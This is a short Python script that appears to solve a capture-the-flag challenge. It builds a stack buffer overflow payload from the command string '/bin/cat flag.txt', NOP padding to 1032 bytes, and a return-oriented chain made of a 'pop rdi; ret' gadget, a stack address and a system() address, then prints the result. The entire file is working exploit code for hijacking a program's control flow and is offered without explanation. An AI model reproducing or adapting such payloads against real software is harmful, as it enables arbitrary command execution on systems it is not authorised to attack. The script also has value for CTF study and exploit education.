import struct

padding_len = 1032

return_addr = 0x00000000004006d1

'''
   pop rdi; 
   ret
'''

bin_cat = 0x7fffffffe150

system_addr = 0x7ffff7a5b590

string = '/bin/cat flag.txt'

nop = '\x90' * (padding_len - (len(string) + 1))

payload =  string + '\x00' + nop + struct.pack('<Q', return_addr) + struct.pack('<Q', bin_cat) + struct.pack('<Q', system_addr)

print payload

